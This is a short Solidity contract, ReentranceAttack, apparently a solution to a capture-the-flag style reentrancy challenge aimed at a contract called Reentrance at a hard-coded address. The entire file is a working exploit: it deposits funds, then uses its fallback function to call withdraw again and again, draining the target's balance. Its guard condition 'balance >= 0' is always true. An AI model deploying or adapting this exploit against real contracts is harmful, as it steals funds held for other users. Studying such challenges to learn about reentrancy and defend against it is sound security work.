// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Reentrance.sol';

contract ReentranceAttack {
    Reentrance target = Reentrance(payable(0xd88618d0Ddd378A2797021b593D805D519bD7255));
    address owner;
    uint amount = 1000000000000000 wei; // 0.001 eth

    constructor() {
        owner = msg.sender;

        // cannot do that in constructor, there is no "this" yet
        // target.donate{value: amount}(address(this));
    }

    function donate() payable public {
        target.donate{value: msg.value}(address(this));
    }

    function withdraw() public {
        target.withdraw(amount);
    }

    // reentrancy must be in the fallback
    fallback() external payable {
        if (address(target).balance >= 0) {
            withdraw();
        }
    }


}